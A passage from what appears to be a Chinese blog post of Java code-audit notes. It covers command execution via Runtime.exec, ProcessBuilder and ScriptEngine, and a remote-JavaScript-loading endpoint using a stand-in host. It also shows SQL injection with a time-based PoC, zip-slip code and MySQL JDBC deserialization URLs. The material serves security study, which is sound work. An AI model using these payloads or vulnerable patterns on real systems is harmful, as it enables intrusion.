Runtime.getRuntime();<br>        runtime.exec(<span class="hljs-string">&quot;cmd.exe /k calc &amp; notepad&quot;</span>);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test4</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        runtime.exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/k&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;notepad&quot;</span>&#125;);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test5</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> runtime.exec(<span class="hljs-string">&quot;ping www.baidu.com&quot;</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> start.getInputStream();<br>        <span class="hljs-type">byte</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        inputStream.read(res);<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(res, <span class="hljs-string">&quot;gbk&quot;</span>));<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        test2();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>java.lang.ProcessBuilder</strong></p><p>ProcessBuilder来执行命令。ProcessBuilder传入参数为列表，第<strong>一个参数为可执行命令程序</strong>，后面的参数为执行的命令程序的参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessBuilderTest</span> &#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;notepad&quot;</span>);<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> processBuilder.start();<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/k&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;notepad&quot;</span>);<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> processBuilder.start();<br>    &#125;<br> <br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        test1();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>java.lang.ProcessImpl</strong></p><p>通过调试ProcessBuilder.start()方法发现，其底层调用了ProcessImpl.start()方法：</p><p><img src="informatin\book\photo\20200613100921885.png" alt="img"></p><p> 但是ProcessImpl类不是public的，因此无法在java.lang包外使用，需要通过反射的方式使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessImplTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="hljs-type">boolean</span>.class);<br>        start.setAccessible(<span class="hljs-literal">true</span>);<br>        start.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">false</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>javax.script.ScriptEngineManager</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvalTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ScriptException &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>().getEngineByExtension(<span class="hljs-string">&quot;js&quot;</span>).eval(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);<br>        System.out.println(result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>jscmd</strong></p><p>访问url为<a href="http://localhost:8080/rce/jscmd?jsurl=http://localhost/exe.js%EF%BC%8C%E4%BC%A0%E5%85%A5%E7%9A%84%E5%8F%82%E6%95%B0%E4%B8%BA%E4%B8%80%E4%B8%AAJavaScript%E4%BB%A3%E7%A0%81%E7%9A%84url%E5%9C%B0%E5%9D%80http://localhost/exe.js">http://localhost:8080/rce/jscmd?jsurl=http://localhost/exe.js，传入的参数为一个JavaScript代码的url地址http://localhost/exe.js</a></p><p>本地的exe.js</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">var</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> mainOutput(); <br>function <span class="hljs-title function_">mainOutput</span><span class="hljs-params">()</span> &#123; <br>    <span class="hljs-keyword">var</span> x=java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>源码如下，使用的是ScriptEngine来对JavaScript代码的调用，最后eval()执行代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * curl http://xx.yy/exe.js</span><br><span class="hljs-comment"> * var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);&#125;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> jsurl js url</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@GetMapping(&quot;/jscmd&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">jsEngine</span><span class="hljs-params">(String jsurl)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-comment">// js nashorn javascript ecmascript</span><br>    <span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>);<span class="hljs-comment">//通过文件扩展名获取：</span><br>    <span class="hljs-comment">//ScriptEngine engine = manager.getEngineByName(&quot;JavaScript&quot;);//通过脚本名称获取：     </span><br>    <span class="hljs-comment">//ScriptEngine engine = manager.getEngineByMimeType(&quot;text/javascript&quot;);  //通过MIME类型来获取： </span><br>    <span class="hljs-type">Bindings</span> <span class="hljs-variable">bindings</span> <span class="hljs-operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);<span class="hljs-comment">//启动javascript引擎</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);<br>    engine.eval(cmd, bindings);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>yml</strong></p><p>SnakeYAML存在的反序列化漏洞来rce，在解析恶意 yml 内容时会完成指定的动作。先是触发java.net.URL去拉取远程 HTTP 服务器上的恶意 jar 文件,然后是寻找 jar 文件中实现javax.script.ScriptEngineFactory接口的类并实例化，实例化类时执行恶意代码，造成 RCE 漏洞。</p><h5 id="文件解压目录穿越漏洞"><a href="#文件解压目录穿越漏洞" class="headerlink" title="文件解压目录穿越漏洞"></a>文件解压目录穿越漏洞</h5><p>在此处获得file的位置没有进行过滤，所以产生了此漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Java"> <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, len = ids.length; i &lt; len; i++) &#123;<br>      <span class="hljs-keyword">if</span> (!Validations.uri(ids[i], base)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CmsException</span>(<span class="hljs-string">&quot;invalidURI&quot;</span>);<br>      &#125;<br>      <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> localFileHandler.getFile(ids[i]);<br>      <span class="hljs-keyword">if</span> (AntZipUtils.isZipFile(file)) &#123;<br>        AntZipUtils.unzip(file, file.getParentFile());<br>        logService.operation(<span class="hljs-string">&quot;opr.webFile.unzip&quot;</span>, ids[i], <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, request);<br>        logger.info(<span class="hljs-string">&quot;unzip file, name=&#123;&#125;.&quot;</span>, ids[i]);<br>      &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><h5 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL Inject"></a>SQL Inject</h5><p>常见的数据库：oracle 、MySQL、SQL Server、Access、H2.</p><p>技巧：动态拼接、预编译有误、框架注入、order by绕过预编译、%和_绕过预编译</p><p>关键词：executeQuery、setObject、setInt、setString、setSQLXML</p><p><code>#&#123;&#125;</code>预处理、<code>$&#123;&#125;</code>拼接</p><p> mybatis的两种变量方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//不安全写法：</span><br>select * from books <span class="hljs-type">where</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> $&#123;id&#125; <span class="hljs-comment">//</span><br><span class="hljs-comment">//安全的写法：</span><br>select * from books <span class="hljs-type">where</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> #&#123;id&#125; <span class="hljs-comment">//：？</span><br><span class="hljs-comment">//like、in和order by 语句也需要使用#</span><br></code></pre></td></tr></table></figure><p>order by 绕过预编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">String sql <span class="hljs-string">&quot;Select * from news where title = ? &quot;</span> + <span class="hljs-string">&quot;order by &#x27;&quot;</span> + time + <span class="hljs-string">&quot;&#x27; asc &quot;</span> <br></code></pre></td></tr></table></figure><p> 预编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PreparedStatemnet</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> connection.prepareStatement(<span class="hljs-string">&quot;SELECT * FROM users SWHERE us erid=? ADN password=?&quot;</span>);<br>stmt.setString(<span class="hljs-number">1</span>,userid);<br>stmt.setString(<span class="hljs-number">2</span>,password); <span class="hljs-comment">//通过占位符？，进行string强类型</span><br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery();<br></code></pre></td></tr></table></figure><p>存储过程防护</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Stirng</span> <span class="hljs-variable">custname</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;customerName&quot;</span>);<br><span class="hljs-keyword">try</span>&#123;<br>  <span class="hljs-type">CallableStatement</span> <span class="hljs-variable">cs</span> <span class="hljs-operator">=</span> connection.prepareCall(<span class="hljs-string">&quot;&#123;callsp_getAccountBalance(?)&#125;&quot;</span>);<br>  cs.setString(<span class="hljs-number">1</span>, custname);<br>&#125; <span class="hljs-keyword">catch</span> (SQLException se)&#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>寻找方法，先找到路由，根据路由判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.Controller;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.EnableAutoConfiguration;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> com.obj.HibernateTest.select2;<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> com.obj.HibernateTest.select4;<br><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldController</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/in&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">in</span><span class="hljs-params">(String payload)</span>&#123;<br>        System.out.println(payload);<br>        <span class="hljs-keyword">return</span> select4(payload);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/in1&quot;)</span><span class="hljs-comment">//表示路由</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">in1</span><span class="hljs-params">(String payload)</span>&#123;<br>        <span class="hljs-keyword">return</span> select2(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">在使用占位符后未进行<span class="hljs-keyword">set</span>Object或者<span class="hljs-keyword">set</span>Int或者<span class="hljs-keyword">set</span>String。<br><br>有些会使用SQLparameter函数，参数化查询SQL，能有效避免SQL注入。<br><br>使用<span class="hljs-keyword">set</span>Properties函数。<br></code></pre></td></tr></table></figure><p>setString那个函数那里对引号等一些特殊符号做了转义，但是还有sql注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 执行查询</span><br>   System.out.println(<span class="hljs-string">&quot; 实例化Statement对象...&quot;</span>);<br>   PreparedStatement st=conn.prepareStatement(<span class="hljs-string">&quot;select * from &quot;</span> +<br>           <span class="hljs-string">&quot;springmysql1 where name=?&quot;</span>);<br>   st.setString(<span class="hljs-number">1</span>,request.getParameter(<span class="hljs-string">&quot;name&quot;</span>));<br>   ResultSet rs=st.executeQuery();<br></code></pre></td></tr></table></figure><p><strong>%和_</strong></p><p>没有手动过滤%。预编译是不能处理这个符号的， 所以需要手动过滤，否则会造成慢查询，造成 dos。</p><p><strong>Order by、from、like等无法预编译</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Select * from news where title =?&quot;</span> + <span class="hljs-string">&quot;order by &#x27;&quot;</span> + time + <span class="hljs-string">&quot;&#x27; asc&quot;</span><br></code></pre></td></tr></table></figure><p><strong>简单案例：</strong></p><p>这个是JFinalCMS的cve，当从代码上看的确有注入拼接，但是因为要钱，我不知道是不是激活码的原因，所以没有复现成功。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">index</span><span class="hljs-params">()</span>&#123;<br>setListQuery();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> getPara(<span class="hljs-string">&quot;name&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> getPara(<span class="hljs-string">&quot;username&quot;</span>);<br><span class="hljs-type">Integer</span> <span class="hljs-variable">pageNumber</span> <span class="hljs-operator">=</span> getParaToInt(<span class="hljs-string">&quot;pageNumber&quot;</span>);<br><span class="hljs-keyword">if</span>(pageNumber==<span class="hljs-literal">null</span>)&#123;<br>pageNumber = <span class="hljs-number">1</span>;<br>&#125;<br>setAttr(<span class="hljs-string">&quot;page&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Admin</span>().dao().findPage(name,username,pageNumber,PAGE_SIZE));<br>setAttr(<span class="hljs-string">&quot;name&quot;</span>, name);<br>setAttr(<span class="hljs-string">&quot;username&quot;</span>, username);<br>render(getView(<span class="hljs-string">&quot;admin/index&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Page&lt;Admin&gt; <span class="hljs-title function_">findPage</span><span class="hljs-params">(String name,String username,Integer pageNumber,Integer pageSize)</span>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filterSql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>       <span class="hljs-keyword">if</span>(StringUtils.isNotBlank(name))&#123;<br>           filterSql+= <span class="hljs-string">&quot; and name like &#x27;%&quot;</span>+name+<span class="hljs-string">&quot;%&#x27;&quot;</span>;<br>       &#125;<br>       <span class="hljs-keyword">if</span>(StringUtils.isNotBlank(username))&#123;<br>           filterSql+= <span class="hljs-string">&quot; and username like &#x27;%&quot;</span>+username+<span class="hljs-string">&quot;%&#x27;&quot;</span>;<br>       &#125;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">orderBySql</span> <span class="hljs-operator">=</span> DbUtils.getOrderBySql(<span class="hljs-string">&quot;createDate desc&quot;</span>);<br><span class="hljs-keyword">return</span> paginate(pageNumber, pageSize, <span class="hljs-string">&quot;select *&quot;</span>, <span class="hljs-string">&quot;from cms_admin where 1=1 &quot;</span>+filterSql+orderBySql);<br>&#125;<br></code></pre></td></tr></table></figure><p> poc：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">name<span class="hljs-operator">=</span><span class="hljs-string">&#x27; AND (SELECT 2522 FROM (SELECT(SLEEP(5)))qFTY) AND &#x27;</span>wguW<span class="hljs-string">&#x27;=&#x27;</span>wguW <br></code></pre></td></tr></table></figure><p>之后的payload，使用<code>LIKE &#39;%&#39;</code>会匹配所有可能的字符串，包括空字符串</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> cms_admin <span class="hljs-keyword">WHERE</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">2522</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span>(SLEEP(<span class="hljs-number">5</span>)))qFTY) <span class="hljs-keyword">AND</span> <span class="hljs-string">&#x27;wguW&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;wguW%&#x27;</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> createDate <span class="hljs-keyword">DESC</span><br></code></pre></td></tr></table></figure><p>  在本地数据库查询为null，并没有不成功。</p><p>like ‘%’实验</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> ujcms_user_ext <span class="hljs-keyword">WHERE</span> history_password_ <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="image-20240405003839930-17122487226371.png" alt="image-20240405003839930"></p><h5 id="mysql反序列化"><a href="#mysql反序列化" class="headerlink" title="mysql反序列化"></a>mysql反序列化</h5><p>5.1.28-5.1.19 不需要detectCustomCollations</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=<span class="hljs-literal">true</span>&amp;user=yso_CommonsCollections5_calc<br></code></pre></td></tr></table></figure><p>5.1.29-5.1.40 不需要detectCustomCollations</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=<span class="hljs-literal">true</span>&amp;detectCustomCollations=<span class="hljs-literal">true</span>&amp;user=yso_CommonsCollections5_calc<br></code></pre></td></tr></table></figure><p>5.1.11及以上的5.x版本: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc<br></code></pre></td></tr></table></figure><p>6.x:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">jdbc:</span>mysql://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3306</span>/test?autoDeserialize=true&amp;statementInterceptors=<span class="hljs-keyword">com</span>.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc<br></code></pre></td></tr></table></figure><p>链接：<a href="https://xz.aliyun.com/t/8159?time__1311=n4+xnD0Dc7GQDtY40KDsA3xCTwniYDgDQuuw97ID">小白看得懂的MySQL JDBC 反序列化漏洞分析 - 先知社区 (aliyun.com)</a></p><p><img src="image-20240717165531115.png" alt="image-20240717165531115"></p><p>ServerStatusDiffInterceptor拦截器执行SHOW SESSION STATUS，返回时输入恶意对象，因此需要构造一个mysql服务器输入恶意编写的payload</p><p><img src="image-20240717165845944-17212067294041-17212067334263.png" alt="image-20240717165845944"></p><h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><p>Java ssrf 中的伪协议：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>;<span class="hljs-keyword">ftp</span>;mailto;<span class="hljs-keyword">http</span>;<span 